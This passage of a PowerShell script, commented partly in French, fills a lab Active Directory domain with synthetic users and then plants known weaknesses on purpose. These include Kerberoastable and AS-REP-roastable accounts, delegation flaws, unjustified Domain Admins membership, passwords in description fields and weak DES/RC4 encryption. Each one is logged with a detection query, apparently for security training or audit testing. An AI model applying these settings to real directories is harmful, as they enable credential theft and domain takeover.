                    Company = $script:Config.CompanyName
                    Office = "$($city.Name) - Tower A"
                    StreetAddress = $city.Address
                    City = $city.Name -replace "-", " "
                    Country = $city.Country
                    PostalCode = Get-RandomPostalCode -Format $city.PostalFormat
                    OfficePhone = Get-RandomPhoneNumber -Prefix $city.Phone
                    EmployeeID = $employeeID
                    Description = "$role - $($dept.Name) Department - $($city.Name)"
                }

                try {
                    # Verifier si l'user existe deja
                    $existingUser = Get-ADUser -Filter "SamAccountName -eq '$sam'" -ErrorAction SilentlyContinue

                    if ($existingUser) {
                        Write-Log "user existe deja: $sam" "INFO"
                    } else {
                        New-ADUser @userParams

                        # Ajouter les attributs supplementaires
                        Set-ADUser -Identity $sam -Replace @{
                            employeeType = $employeeType
                        }

                        Write-Log "user cree: $displayName ($sam)" "SuccessS"
                    }

                    # Stocker les informations
                    $userInfo = @{
                        SamAccountName = $sam
                        DisplayName = $displayName
                        UPN = $upn
                        Department = $dept.Name
                        City = $city.Name
                        Role = $role
                        EmployeeID = $employeeID
                        EmployeeType = $employeeType
                        IsManager = $isManager
                        IsTeamLead = $isTeamLead
                        IsDirector = $isDirector
                        IsExecutive = $isExecutive
                        Password = $PlainPassword
                        Vulnerable = $false
                        VulnType = @()
                    }

                    $script:AllUsers += $userInfo

                    # Tracking des managers
                    if ($isManager) {
                        $key = "$($city.Name)_$($dept.Name)"
                        $script:DeptManagers[$key] = $sam
                    }
                    if ($isTeamLead) {
                        $key = "$($city.Name)_$($dept.Name)_$u"
                        $script:TeamLeads[$key] = $sam
                    }

                    # Ajouter aux groups appropries
                    $groupsToAdd = @(
                        "GS-$($dept.Name)",
                        "GS-$($city.Name)",
                        "DL-$($dept.Name)-All",
                        "DL-$($city.Name)-All",
                        "DL-AllStaff"
                    )

                    if ($isManager) { $groupsToAdd += "GS-Managers" }
                    if ($isTeamLead) { $groupsToAdd += "GS-TeamLeads" }
                    if ($isExecutive) { $groupsToAdd += "GS-Executives" }
                    if ($employeeType -eq "Contractor") { $groupsToAdd += "GS-Contractors" }
                    if ($employeeType -eq "Intern") { $groupsToAdd += "GS-Interns" }
                    if ($employeeType -eq "Full-Time") { $groupsToAdd += "GS-Employees" }

                    # Ajouter aleatoirement a des projets
                    if ((Get-Random -minimum 1 -Maximum 100) -le 30) {
                        $projects = @("Alpha", "Beta", "Gamma", "Delta", "Epsilon", "Phoenix", "Titan", "Nova", "Apex", "Zenith")
                        $randomProject = $projects | Get-Random
                        $groupsToAdd += "GS-Project-$randomProject"
                    }

                    # VPN/Remote (30% des employes)
                    if ((Get-Random -minimum 1 -Maximum 100) -le 30) {
                        $groupsToAdd += "GS-VPN-Users"
                        $groupsToAdd += "GS-RemoteWorkers"
                    }

                    foreach ($groupName in $groupsToAdd) {
                        try {
                            Add-ADGroupMember -Identity $groupName -Members $sam -ErrorAction SilentlyContinue
                        } catch {
                            # group n'existe peut-etre pas encore ou membre deja present
                        }
                    }

                    $createdCount++

                    # Afficher la progression
                    if ($createdCount % 100 -eq 0) {
                        $percentage = [math]::Round(($createdCount / $totalUsers) * 100, 1)
                        Write-Log "Progression: $createdCount / $totalUsers ($percentage%)" "INFO"
                    }

                } catch {
                    Write-Log "Error creation user $sam : $_" "ERROR"
                    $script:Config.Errors += "User: $sam - $_"
                }
            }
        }
    }

    Write-Log "Creatings users Completede: $createdCount crees" "SuccessS"
    return $script:AllUsers
}

# ============================================================================
# Configuring manager hierarchy
# ============================================================================

function Set-ManagerHierarchy {
    Write-Log "=== Configuring manager hierarchy ===" "INFO"

    # OPTIMIZATION: Build lookup hashtables once instead of repeated Where-Object calls
    Write-Log "Building user lookup indexes..." "INFO"

    $executives = @()
    $managers = @()
    $teamLeads = @()
    $employees = @()
    $ceo = $null

    # Index executives by department for O(1) lookup
    $executivesByDept = @{}

    # Index team leads by location (City_Department) for O(1) lookup
    $teamLeadsByLocation = @{}

    # Index users by SamAccountName for O(1) lookup
    $usersBySam = @{}

    # Single pass through all users to categorize and index
    foreach ($user in $script:AllUsers) {
        # Index by SamAccountName
        $usersBySam[$user.SamAccountName] = $user

        # Find CEO
        if (-not $ceo -and ($user.Role -like "*Chief Executive*" -or $user.Role -like "*CEO*")) {
            $ceo = $user
        }

        # Categorize users
        if ($user.IsExecutive) {
            $executives += $user
            # Index executives by department
            if ($user.Department -and -not $executivesByDept.ContainsKey($user.Department)) {
                $executivesByDept[$user.Department] = $user
            }
        } elseif ($user.IsManager) {
            $managers += $user
        } elseif ($user.IsTeamLead) {
            $teamLeads += $user
            # Index team leads by location
            $key = "$($user.City)_$($user.Department)"
            if (-not $teamLeadsByLocation[$key]) {
                $teamLeadsByLocation[$key] = @()
            }
            $teamLeadsByLocation[$key] += $user
        } else {
            $employees += $user
        }
    }

    # Fallback: if no CEO found by role, pick first executive
    if (-not $ceo -and $executives.Count -gt 0) {
        $ceo = $executives[0]
    }

    if (-not $ceo) {
        Write-Log "No CEO found, skipping manager hierarchy" "WARNING"
        return
    }

    Write-Log "CEO identifie: $($ceo.DisplayName)" "INFO"
    Write-Log "Executives: $($executives.Count), Managers: $($managers.Count), Team Leads: $($teamLeads.Count), Employees: $($employees.Count)" "INFO"

    # 1. Executives report to CEO
    $execCount = 0
    foreach ($exec in $executives) {
        if ($exec.SamAccountName -ne $ceo.SamAccountName) {
            try {
                Set-ADUser -Identity $exec.SamAccountName -Manager $ceo.SamAccountName -ErrorAction Stop
                $execCount++
            } catch {
                Write-Log "Error assignation manager for $($exec.SamAccountName): $_" "WARNING"
            }
        }
    }
    Write-Log "Assigned $execCount executives to CEO" "INFO"

    # 2. Department managers report to executives
    $mgrCount = 0
    foreach ($manager in $managers) {
        # Fast lookup: executive of same department, or random executive
        $exec = $executivesByDept[$manager.Department]
        if (-not $exec -and $executives.Count -gt 0) {
            $exec = $executives | Get-Random
        }

        if ($exec) {
            try {
                Set-ADUser -Identity $manager.SamAccountName -Manager $exec.SamAccountName -ErrorAction Stop
                $mgrCount++
            } catch {
                Write-Log "Error assignation manager for $($manager.SamAccountName): $_" "WARNING"
            }
        }
    }
    Write-Log "Assigned $mgrCount managers to executives" "INFO"

    # 3. Team leads report to department managers
    $tlCount = 0
    foreach ($tl in $teamLeads) {
        $managerKey = "$($tl.City)_$($tl.Department)"
        $managerSam = $script:DeptManagers[$managerKey]

        if ($managerSam -and $managerSam -ne $tl.SamAccountName) {
            try {
                Set-ADUser -Identity $tl.SamAccountName -Manager $managerSam -ErrorAction Stop
                $tlCount++
            } catch {
                Write-Log "Error assignation manager for $($tl.SamAccountName): $_" "WARNING"
            }
        }
    }
    Write-Log "Assigned $tlCount team leads to managers" "INFO"

    # 4. Regular employees report to team leads or managers (OPTIMIZED - no Where-Object loops!)
    $empCount = 0
    $batchSize = 1000
    $processed = 0

    foreach ($emp in $employees) {
        # Fast O(1) lookup in hashtable instead of O(n) Where-Object
        $locationKey = "$($emp.City)_$($emp.Department)"
        $potentialLeads = $teamLeadsByLocation[$locationKey]

        $leadSam = $null
        if ($potentialLeads -and $potentialLeads.Count -gt 0) {
            # Pick random team lead from this location
            $leadSam = ($potentialLeads | Get-Random).SamAccountName
        } else {
            # Fallback to department manager using O(1) hashtable lookup
            $leadSam = $script:DeptManagers[$locationKey]
        }

        if ($leadSam) {
            try {
                Set-ADUser -Identity $emp.SamAccountName -Manager $leadSam -ErrorAction Stop
                $empCount++
            } catch {
                # Silent - too many to log
            }
        }

        $processed++
        if ($processed % $batchSize -eq 0) {
            Write-Log "Processed $processed/$($employees.Count) employees..." "INFO"
        }
    }
    Write-Log "Assigned $empCount employees to team leads/managers" "SuccessS"

    Write-Log "Hierarchie des managers configuree" "SuccessS"
}

# ============================================================================
# InjectingS VULNeRABILITeS
# ============================================================================

function Add-SecurityVulnerabilities {
    param(
        [array]$Users,
        [string]$PlainPassword
    )

    Write-Log "=== Injectings vulnerabilites de securite ===" "WARNING"

    $vulnerabilities = @()
    $totalUsers = $Users.Count

    if ($totalUsers -eq 0) {
        Write-Log "No users to inject vulnerabilities into!" "ERROR"
        return @()
    }

    # Calculer le nombre de users vulnerables (percentage OU nombre absolu)
    if ($script:VulnUserCount -gt 0) {
        # Mode absolu: nombre exact de users
        $vulnCount = [math]::Min($script:VulnUserCount, $totalUsers)
        Write-Log "Vulnerability mode: ABSOLUTE - injecting into $vulnCount users (requested: $($script:VulnUserCount))" "INFO"
    } else {
        # Mode pourcentage: utiliser VulnPercent
        $vulnPercent = if ($script:VulnPercent) { $script:VulnPercent } else { 10 }
        $vulnCount = [math]::Round($totalUsers * ($vulnPercent / 100.0))
        Write-Log "Vulnerability mode: PERCENTAGE - $vulnPercent% of $totalUsers users = $vulnCount users" "INFO"
    }

    # Selectionner des users aleatoires for les vulnerabilites
    $randomCount = [math]::Max(1, [math]::Min($vulnCount * 2, $Users.Count))
    $vulnCandidates = $Users | Get-Random -Count $randomCount

    $vulnIndex = 0

    # =========================================================================
    # 1. PASSWORD NEVER EXPIRES (8% des vulnerables)
    # =========================================================================
    $pwdNeverExpireCount = [math]::Round($vulnCount * 0.08)
    Write-Log "Injection: PasswordNeverExpires on $pwdNeverExpireCount users..." "WARNING"

    for ($i = 0; $i -lt $pwdNeverExpireCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADUser -Identity $user.SamAccountName -PasswordNeverExpires $true
            $vulnerabilities += @{
                Type = "PasswordNeverExpires"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "Le mot de passe n'expire jamais"
                Detection = "Get-ADUser -Filter {PasswordNeverExpires -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "PasswordNeverExpires"
        } catch {
            Write-Log "Error PasswordNeverExpires for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 2. PASSWORD NOT REQUIRED (2% - Critique!)
    # =========================================================================
    $pwdNotReqCount = [math]::Round($vulnCount * 0.02)
    Write-Log "Injection: PasswordNotRequired on $pwdNotReqCount users..." "WARNING"

    for ($i = 0; $i -lt $pwdNotReqCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADAccountControl -Identity $user.SamAccountName -PasswordNotRequired $true
            $vulnerabilities += @{
                Type = "PasswordNotRequired"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Mot de passe non requis - compte peut etre vide"
                Detection = "Get-ADUser -Filter {PasswordNotRequired -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "PasswordNotRequired"
        } catch {
            Write-Log "Error PasswordNotRequired for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 3. REVERSIBLE ENCRYPTION (1% - Tres dangereux)
    # =========================================================================
    $reversibleCount = [math]::Round($vulnCount * 0.01)
    if ($reversibleCount -lt 1) { $reversibleCount = 1 }
    Write-Log "Injection: AllowReversiblePasswordEncryption on $reversibleCount users..." "WARNING"

    for ($i = 0; $i -lt $reversibleCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADUser -Identity $user.SamAccountName -AllowReversiblePasswordEncryption $true
            $vulnerabilities += @{
                Type = "ReversibleEncryption"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Chiffrement reversible active - mot de passe recuperable"
                Detection = "Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ReversibleEncryption"
        } catch {
            Write-Log "Error ReversibleEncryption for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 4. AS-REP ROASTABLE - DoesNotRequirePreAuth (3%)
    # =========================================================================
    $asrepCount = [math]::Round($vulnCount * 0.03)
    Write-Log "Injection: DoesNotRequirePreAuth (AS-REP Roastable) on $asrepCount users..." "WARNING"

    for ($i = 0; $i -lt $asrepCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADAccountControl -Identity $user.SamAccountName -DoesNotRequirePreAuth $true
            $vulnerabilities += @{
                Type = "ASREPRoastable"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Pre-auth Kerberos desactivee - vulnerable AS-REP Roasting"
                Detection = "Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ASREPRoastable"
        } catch {
            Write-Log "Error DoesNotRequirePreAuth for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 5. KERBEROASTABLE - SPN on comptes users (3%)
    # =========================================================================
    $spnCount = [math]::Round($vulnCount * 0.03)
    Write-Log "Injection: SPN (Kerberoastable) on $spnCount users..." "WARNING"

    $services = @("HTTP", "MSSQLSvc", "LDAP", "FTP", "SMTP", "IMAP", "POP3", "DNS", "WSMAN", "TERMSRV")

    for ($i = 0; $i -lt $spnCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            $service = $services | Get-Random
            $spn = "$service/$($user.SamAccountName).$($script:Config.Domain)"
            Set-ADUser -Identity $user.SamAccountName -ServicePrincipalNames @{Add=$spn}
            $vulnerabilities += @{
                Type = "Kerberoastable"
                User = $user.SamAccountName
                Severity = "High"
                Description = "SPN configure on compte user - vulnerable Kerberoasting"
                SPN = $spn
                Detection = "Get-ADUser -Filter {ServicePrincipalNames -like '*'} -Properties ServicePrincipalNames"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Kerberoastable"
        } catch {
            Write-Log "Error SPN for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 6. UNCONSTRAINED DELEGATION (0.5%)
    # =========================================================================
    $unconstrainedCount = [math]::Max(1, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Unconstrained Delegation on $unconstrainedCount users..." "WARNING"

    for ($i = 0; $i -lt $unconstrainedCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADAccountControl -Identity $user.SamAccountName -TrustedForDelegation $true
            $vulnerabilities += @{
                Type = "UnconstrainedDelegation"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Delegation Kerberos non contrainte - peut impersonate n'importe quel user"
                Detection = "Get-ADUser -Filter {TrustedForDelegation -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "UnconstrainedDelegation"
        } catch {
            Write-Log "Error Unconstrained Delegation for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 7. CONSTRAINED DELEGATION (0.5%)
    # =========================================================================
    $constrainedCount = [math]::Max(1, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Constrained Delegation on $constrainedCount users..." "WARNING"

    for ($i = 0; $i -lt $constrainedCount -and $vulnIndex -lt $vulnCandidates.Count; $i++) {
        $user = $vulnCandidates[$vulnIndex]
        $vulnIndex++

        try {
            Set-ADAccountControl -Identity $user.SamAccountName -TrustedToAuthForDelegation $true

            # Ajouter les services autorises pour la delegation (msDS-AllowedToDelegateTo)
            $delegationTargets = @(
                "CIFS/fileserver.aza-me.cc",
                "HTTP/webserver.aza-me.cc",
                "MSSQL/dbserver.aza-me.cc"
            )
            Set-ADUser -Identity $user.SamAccountName -Add @{'msDS-AllowedToDelegateTo'=$delegationTargets} -ErrorAction SilentlyContinue

            $vulnerabilities += @{
                Type = "ConstrainedDelegation"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Delegation contrainte with transition de protocole"
                Detection = "Get-ADUser -Filter {TrustedToAuthForDelegation -eq `$true}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "ConstrainedDelegation"
        } catch {
            Write-Log "Error Constrained Delegation for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 8. MEMBRES DOMAIN ADMINS NON LeGITIMES (0.5%)
    # =========================================================================
    $daCount = [math]::Max(3, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Ajout non legitime a Domain Admins for $daCount users..." "WARNING"

    # Prendre des users NON executives
    $nonExecUsers = $Users | Where-Object { -not $_.IsExecutive -and -not $_.IsManager } | Get-Random -Count $daCount

    foreach ($user in $nonExecUsers) {
        try {
            Add-ADGroupMember -Identity "Domain Admins" -Members $user.SamAccountName
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_DA"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "user standard membre de Domain Admins sans justification"
                Detection = "Get-ADGroupMember 'Domain Admins' | Get-ADUser -Properties Title,Department"
            }
            $user.Vulnerable = $true
            $user.VulnType += "DomainAdmin"
        } catch {
            Write-Log "Error ajout Domain Admins for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 9. ACCOUNT OPERATORS (1%)
    # =========================================================================
    $aoCount = [math]::Max(2, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Adding to Account Operators for $aoCount users..." "WARNING"

    $aoUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $aoCount

    foreach ($user in $aoUsers) {
        try {
            Add-ADGroupMember -Identity "Account Operators" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_AO"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Account Operators - peut creer/modifier des comptes"
                Detection = "Get-ADGroupMember 'Account Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "AccountOperators"
        } catch {
            # Le group peut ne pas exister on certains DC
        }
    }

    # =========================================================================
    # 10. BACKUP OPERATORS (1%)
    # =========================================================================
    $boCount = [math]::Max(2, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Adding to Backup Operators for $boCount users..." "WARNING"

    $boUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $boCount

    foreach ($user in $boUsers) {
        try {
            Add-ADGroupMember -Identity "Backup Operators" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_BO"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Backup Operators - peut dump SAM/NTDS"
                Detection = "Get-ADGroupMember 'Backup Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "BackupOperators"
        } catch {
            # Le group peut ne pas exister
        }
    }

    # =========================================================================
    # 11. DNSADMINS (0.5%)
    # =========================================================================
    $dnsCount = [math]::Max(2, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Adding to DnsAdmins for $dnsCount users..." "WARNING"

    $dnsUsers = $Users | Where-Object { $_.Department -ne "IT" } | Get-Random -Count $dnsCount

    foreach ($user in $dnsUsers) {
        try {
            Add-ADGroupMember -Identity "DnsAdmins" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_DNS"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Non-IT membre de DnsAdmins - peut charger DLL malveillante"
                Detection = "Get-ADGroupMember 'DnsAdmins'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "DnsAdmins"
        } catch {
            # Le group peut ne pas exister
        }
    }

    # =========================================================================
    # 12. DESCRIPTION CONTENANT MOT DE PASSE (1%)
    # =========================================================================
    $descPwdCount = [math]::Max(5, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Mots de passe in description for $descPwdCount users..." "WARNING"

    $weakPasswords = @("Password123!", "Summer2024!", "Welcome1!", "Temp1234!", "Company2024!", "P@ssw0rd!", "Admin123!")
    $descPwdUsers = $Users | Get-Random -Count $descPwdCount

    foreach ($user in $descPwdUsers) {
        try {
            $weakPwd = $weakPasswords | Get-Random
            $descriptions = @(
                "Temp pwd: $weakPwd - a changer",
                "Initial password = $weakPwd",
                "Mot de passe temporaire: $weakPwd",
                "pwd=$weakPwd (temp account)",
                "Reset pwd to $weakPwd on $(Get-Date -Format 'yyyy-MM-dd')"
            )
            $desc = $descriptions | Get-Random

            Set-ADUser -Identity $user.SamAccountName -Description $desc
            $vulnerabilities += @{
                Type = "PasswordInDescription"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Mot de passe visible in le champ description"
                ActualPassword = $weakPwd
                Detection = "Get-ADUser -Filter * -Properties Description | Where-Object {`$_.Description -match 'pass|pwd|mot de passe'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "PasswordInDescription"
        } catch {
            Write-Log "Error description password for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 13. COMPTES DeSACTIVeS in groups ADMINS (0.5%)
    # =========================================================================
    $disabledAdminCount = [math]::Max(3, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Comptes desactives in groups admins for $disabledAdminCount users..." "WARNING"

    $disabledAdminUsers = $Users | Get-Random -Count $disabledAdminCount

    foreach ($user in $disabledAdminUsers) {
        try {
            # Desactiver le compte
            Disable-ADAccount -Identity $user.SamAccountName

            # Ajouter a un group privilegie
            $privGroups = @("Domain Admins", "Account Operators", "Backup Operators")
            $targetGroup = $privGroups | Get-Random

            Add-ADGroupMember -Identity $targetGroup -Members $user.SamAccountName -ErrorAction SilentlyContinue

            $vulnerabilities += @{
                Type = "DisabledAccountInPrivGroup"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Compte desactive mais membre de $targetGroup - reactivation = DA"
                Group = $targetGroup
                Detection = "Get-ADGroupMember '$targetGroup' | Get-ADUser | Where-Object {-not `$_.Enabled}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "DisabledInPrivGroup"
        } catch {
            Write-Log "Error disabled admin for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 14. COMPTES with NOMS SUSPECTS (2%)
    # =========================================================================
    $suspectCount = [math]::Max(5, [math]::Round($vulnCount * 0.02))
    Write-Log "Creating comptes with noms suspects: $suspectCount comptes..." "WARNING"

    $suspectNames = @(
        @{ Sam = "admin"; Desc = "Compte admin generique" }
        @{ Sam = "administrator2"; Desc = "Doublon Administrator" }
        @{ Sam = "backup_admin"; Desc = "Admin de backup non documente" }
        @{ Sam = "svc_sql"; Desc = "Service SQL with privileges eleves" }
        @{ Sam = "svc_backup"; Desc = "Service backup" }
        @{ Sam = "test_user"; Desc = "Compte de test oublie" }
        @{ Sam = "tmp_admin"; Desc = "Admin temporaire" }
        @{ Sam = "old_admin"; Desc = "Ancien admin" }
        @{ Sam = "dev_admin"; Desc = "Admin de dev en prod" }
        @{ Sam = "support_admin"; Desc = "Support with droits admin" }
    )

    $rootOU = "OU=$($script:Config.RootOU),$($script:Config.DomainDN)"
    $secureDefaultPwd = ConvertTo-SecureString $PlainPassword -AsPlainText -Force

    foreach ($suspect in ($suspectNames | Select-Object -First $suspectCount)) {
        try {
            # Verifier si existe deja
            $existing = Get-ADUser -Filter "SamAccountName -eq '$($suspect.Sam)'" -ErrorAction SilentlyContinue
            if (-not $existing) {
                New-ADUser -Name $suspect.Sam -SamAccountName $suspect.Sam `
                    -UserPrincipalName "$($suspect.Sam)@$($script:Config.Domain)" `
                    -Path $rootOU -AccountPassword $secureDefaultPwd -Enabled $true `
                    -Description $suspect.Desc

                # Certains with privileges
                if ($suspect.Sam -like "*admin*") {
                    Add-ADGroupMember -Identity "Domain Admins" -Members $suspect.Sam -ErrorAction SilentlyContinue
                }
            }

            $vulnerabilities += @{
                Type = "SuspiciousAccountName"
                User = $suspect.Sam
                Severity = "Medium"
                Description = "Nom de compte suspect: $($suspect.Desc)"
                Detection = "Get-ADUser -Filter {SamAccountName -like '*admin*' -or SamAccountName -like '*test*' -or SamAccountName -like '*tmp*' -or SamAccountName -like '*svc_*'}"
            }
        } catch {
            Write-Log "Error creation compte suspect $($suspect.Sam): $_" "ERROR"
        }
    }

    # =========================================================================
    # 14.5. SERVICE ACCOUNTS WITH VULNERABILITIES (5 types) - P2 Priority
    # =========================================================================
    $serviceAccountCount = [math]::Max(8, [math]::Round($vulnCount * 0.015))
    Write-Log "Injection: Creating vulnerable service accounts: $serviceAccountCount accounts..." "CRITICAL"

    $serviceAccountsOU = "OU=Service-Accounts,OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

    $serviceNames = @(
        @{Sam="svc.sql.prod"; Desc="SQL Server Production Service"; SPN="MSSQLSvc/sqlprod.aza-me.cc:1433"},
        @{Sam="svc.iis.web"; Desc="IIS Web Application Pool"; SPN="HTTP/webapp.aza-me.cc"},
        @{Sam="svc.sharepoint"; Desc="SharePoint Farm Service"; SPN="HTTP/sharepoint.aza-me.cc"},
        @{Sam="svc.exchange.mailbox"; Desc="Exchange Mailbox Replication"; SPN="exchangeMDB/exchange.aza-me.cc"},
        @{Sam="svc.backup.veeam"; Desc="Veeam Backup Service"; SPN=""},
        @{Sam="svc.monitoring.scom"; Desc="SCOM Monitoring Agent"; SPN=""},
        @{Sam="svc.app.crm"; Desc="CRM Application Service"; SPN="HTTP/crm.aza-me.cc"},
        @{Sam="svc.bi.reporting"; Desc="BI Reporting Services"; SPN="HTTP/reports.aza-me.cc"},
        @{Sam="svc.devops.jenkins"; Desc="Jenkins Build Service"; SPN="HTTP/jenkins.aza-me.cc"},
        @{Sam="svc.db.oracle"; Desc="Oracle Database Service"; SPN=""}
    )

    foreach ($svcAccount in ($serviceNames | Select-Object -First $serviceAccountCount)) {
        try {
            $svcSamAccount = $svcAccount.Sam

            # Check if already exists
            $existing = Get-ADUser -Filter "SamAccountName -eq '$svcSamAccount'" -ErrorAction SilentlyContinue
            if ($existing) { continue }

            # Create service account
            New-ADUser -Name $svcSamAccount -SamAccountName $svcSamAccount `
                -UserPrincipalName "$svcSamAccount@$($script:Config.Domain)" `
                -Path $serviceAccountsOU `
                -AccountPassword $secureDefaultPwd `
                -Enabled $true `
                -Description $svcAccount.Desc `
                -PasswordNeverExpires $true `
                -CannotChangePassword $true

            # VULNERABILITY 1: SERVICE_ACCOUNT_WITH_SPN (Kerberoasting target)
            if ($svcAccount.SPN) {
                try {
                    Set-ADUser -Identity $svcSamAccount -ServicePrincipalNames @{Add=$svcAccount.SPN}
                    $vulnerabilities += @{
                        Type = "SERVICE_ACCOUNT_WITH_SPN"
                        User = $svcSamAccount
                        SPN = $svcAccount.SPN
                        Severity = "High"
                        Description = "Service account with SPN - Kerberoastable target"
                        Impact = "Offline password cracking via Kerberoasting attack"
                        Detection = "Get-ADUser -Filter {ServicePrincipalName -like '*' -and SamAccountName -like 'svc*'} -Properties ServicePrincipalName"
                        MITRE = "T1558.003 - Kerberoasting"
                    }
                    Write-Log "  Created Kerberoastable service account: $svcSamAccount" "WARNING"
                } catch {}
            }

            # VULNERABILITY 2: SERVICE_ACCOUNT_OLD_PASSWORD (simulated > 1 year)
            if ((Get-Random -Maximum 100) -lt 40) {
                try {
                    Set-ADUser -Identity $svcSamAccount -Replace @{pwdLastSet=0}
                    $vulnerabilities += @{
                        Type = "SERVICE_ACCOUNT_OLD_PASSWORD"
                        User = $svcSamAccount
                        Severity = "High"
                        Description = "Service account password older than 1 year (or never changed)"
                        Impact = "Long-lived passwords increase crack success probability"
                        Detection = "Get-ADUser -Filter {SamAccountName -like 'svc*'} -Properties PasswordLastSet | Where-Object {`$_.PasswordLastSet -lt (Get-Date).AddDays(-365)}"
                        Remediation = "Implement password rotation policy for service accounts"
                    }
                } catch {}
            }

            # VULNERABILITY 3: SERVICE_ACCOUNT_PRIVILEGED (in administrative groups)
            if ((Get-Random -Maximum 100) -lt 25) {
                try {
                    $privGroups = @("Domain Admins", "Account Operators", "Backup Operators")
                    $targetGroup = $privGroups | Get-Random
                    Add-ADGroupMember -Identity $targetGroup -Members $svcSamAccount -ErrorAction Stop

                    $vulnerabilities += @{
                        Type = "SERVICE_ACCOUNT_PRIVILEGED"
                        User = $svcSamAccount
                        Group = $targetGroup
                        Severity = "Critical"
                        Description = "Service account in privileged group - excessive permissions"
                        Impact = "Service compromise = privileged access; violates least privilege"
                        Detection = "Get-ADGroupMember 'Domain Admins','Enterprise Admins','Backup Operators' | Where-Object {`$_.SamAccountName -like 'svc*'}"
                        Remediation = "Remove from admin groups; use gMSA or least-privilege service accounts"
                    }
                    Write-Log "  CRITICAL: Service account $svcSamAccount in $targetGroup" "WARNING"
                } catch {}
            }

            # VULNERABILITY 4: SERVICE_ACCOUNT_NO_PREAUTH (AS-REP Roastable)
            if ((Get-Random -Maximum 100) -lt 20) {
                try {
                    Set-ADAccountControl -Identity $svcSamAccount -DoesNotRequirePreAuth $true
                    $vulnerabilities += @{
                        Type = "SERVICE_ACCOUNT_NO_PREAUTH"
                        User = $svcSamAccount
                        Severity = "High"
                        Description = "Service account without Kerberos pre-authentication - AS-REP Roastable"
                        Impact = "Offline password cracking without authentication"
                        Detection = "Get-ADUser -Filter {DoesNotRequirePreAuth -eq `$true -and SamAccountName -like 'svc*'}"
                        MITRE = "T1558.004 - AS-REP Roasting"
                    }
                } catch {}
            }

            # VULNERABILITY 5: SERVICE_ACCOUNT_WEAK_ENCRYPTION (DES/RC4 only)
            if ((Get-Random -Maximum 100) -lt 30) {
                try {
                    # Set weak encryption types (DES + RC4 only)
                    Set-ADUser -Identity $svcSamAccount -Replace @{'msDS-SupportedEncryptionTypes'=7}  # DES_CBC_CRC + DES_CBC_MD5 + RC4_HMAC
                    $vulnerabilities += @{
                        Type = "SERVICE_ACCOUNT_WEAK_ENCRYPTION"
                        User = $svcSamAccount
                        EncryptionTypes = "DES/RC4 only"
                        Severity = "Medium"
                        Description = "Service account supports only weak encryption types (DES/RC4)"
                        Impact = "Vulnerable to downgrade attacks and weak crypto exploitation"
